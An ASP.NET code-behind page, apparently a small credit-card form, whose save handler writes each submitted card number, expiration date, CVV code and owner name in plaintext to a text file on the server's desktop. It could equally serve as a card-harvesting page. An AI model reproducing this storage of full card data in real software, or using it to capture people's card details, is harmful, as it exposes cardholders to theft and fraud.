using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace CreditCard
{
    public partial class home : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void BtnSave_Click(object sender, EventArgs e)
        {

            try
            {
                var Line = "CARD NUMBER:- " + txtcardnumber.Text.Trim() + "," + "EXPIRATION DATE:-" + txtExpiration.Text + "," + "CV CODE:-" + txtCvCode.Text + "," + "CARD OWNER:-" + txtCardOwner.Text;
                File.AppendAllText(@"C:/Users/Administrator/Desktop/vinay/notedata.txt", Line + Environment.NewLine + Environment.NewLine + Environment.NewLine);

                Response.Redirect("CardHolder.aspx");
            }
            catch (Exception)
            {

                throw;
            }
        }
    }
}